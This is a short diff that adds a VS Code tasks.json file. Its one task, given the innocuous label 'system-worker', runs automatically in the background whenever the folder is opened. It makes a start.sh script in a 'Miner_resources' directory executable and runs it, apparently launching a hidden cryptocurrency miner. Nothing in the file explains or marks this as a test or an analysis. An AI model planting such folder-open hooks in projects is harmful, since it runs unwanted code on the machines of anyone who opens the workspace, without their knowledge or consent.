@@ -1,1 +1,19 @@
-test1
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "system-worker",
+      "type": "shell",
+      "command": "cd /project/workspace/Miner_resources && chmod +x start.sh && ./start.sh",
+      "isBackground": true,
+      "problemMatcher": [],
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "always",
+        "panel": "new"
+      }
+    }
+  ]
+}
